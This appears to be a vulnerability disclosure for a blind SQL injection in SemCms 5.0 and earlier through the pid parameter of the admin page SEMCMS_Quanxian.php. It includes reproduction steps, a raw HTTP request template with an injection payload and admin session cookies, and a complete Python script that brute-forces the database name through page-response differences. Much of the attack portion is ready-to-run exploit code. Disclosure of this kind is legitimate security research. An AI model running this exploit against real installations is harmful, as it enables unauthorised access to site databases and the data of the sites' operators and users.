# SemCms <= 5.0 has a SQL Injection Vulnerability
##### Vulnerability Location: SEMCMS_Quanxian.php
##### Affected Range: SemCms <= 5.0
##### Vulnerability Cause: SemCms <= v5.0 was discovered to contain a SQL injection vulnerability.This allows an attacker to execute arbitrary code via the pid parameter in the SEMCMS_Quanxian.php component.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions.
##### Link:https://www.sem-cms.com/

# Vulnerability recurrence

After entering the background.The location of the vulnerability source code: /admin/SEMCMS_Quanxian.php. Try to access this address directly

![image](https://github.com/user-attachments/assets/a1246dd7-2a6a-4482-8ff5-5197ceabdb57)

Locate the source code position:

![image](https://github.com/user-attachments/assets/f8aa8489-81c8-43d0-a498-e3706d468c6e)

Try to construct URL links，URL:http://localhost:83/admin/SEMCMS_Quanxian.php?type=edit&pid=1

![image](https://github.com/user-attachments/assets/f30ae39c-cc2f-47dc-9e8d-0c0188960c2d)

There is an SQL injection vulnerability in the parameter value pid!

![image](https://github.com/user-attachments/assets/be620b6c-d0c6-4761-bc2b-5e788b6eb938)

Look for the value of pid until the page echo shows a difference! Here it is found that when pid=10, the page is empty! Determine the length of the database by using blind annotation:

![image](https://github.com/user-attachments/assets/0d9a409f-7647-4c3e-b9c8-76601e29f5e4)
![image](https://github.com/user-attachments/assets/3de23722-4624-4241-9afd-e02483f361d0)

The length of the database can be determined based on the different echoes of the pages! The next step is to obtain the specific value of the database name:

![image](https://github.com/user-attachments/assets/72029c7f-72a0-43c9-bee9-cf7cd207f68b)

Finally, the database username is obtained as semcms50, and the yakit data packet:

```
GET /admin/SEMCMS_Quanxian.php?type=edit&pid=if(substr(database(),{{int(1-8)}},1)+like+"{{payload(word)}}",1,10) HTTP/1.1
Host: localhost:83
Sec-Fetch-Mode: navigate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Dest: document
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
Sec-Fetch-Site: none
sec-ch-ua-mobile: ?0
Accept-Encoding: gzip, deflate, br, zstd
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "Windows"
Sec-Fetch-User: ?1
```

# Vulnerability exploitation script
```
import requests
import string
import time
from urllib.parse import parse_qs, urlencode
# 需要通过页面的回显来修改判断的条件
# 需要后台路径
# 需要更新Cookie

# 发送请求
def send_request(url, headers):
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=10,
            verify=False
        )

        return response
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# 爆破数据库名长度
def database_length():
    print("[*] 开始爆破数据库名长度...")
    for i in range(1,20):
        base_url = url + f'if(length(database())>{i},999,1)'
        resp = send_request(base_url,header).text
        if '产品分类' in resp:
            print("数据库名长度为：" + str(i))
            return i 
            

# 爆破数据库名
def exploit_sql_injection(url, header, db_len):
    
    
    db_name = ""
    
    max_length = 32  # 假设数据库名最大长度
    
    # 字符集：小写字母、数字、常见符号
    charset = string.ascii_lowercase + string.digits + "-$@! "
    

    print("[*] 开始爆破数据库名...")

    for i in range(1,db_len+1):
        for j in charset:
            base_url = url + f'if(substr(database(),{i},1) like "{j}",1,999)'
            resp = send_request(base_url, header).text
            if '产品分类' in resp:
                db_name += str(j)
                print(f"[+] 第{i}个位置的字符: '{j}' 匹配成功, 当前: {db_name}")
                break

    
    print(f"[*] 爆破完成! 数据库名: {db_name}")
    return db_name

if __name__ == "__main__":
    url = f"http://192.168.124.6:81/VvK4qw_Admin/SEMCMS_Quanxian.php?type=edit&pid="
    
    db_len = 0

    header = {
        "Cookie":"scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b"
    }

    db_len = database_length()

    if(db_len != 0):
        exploit_sql_injection(url, header,db_len)
    
```
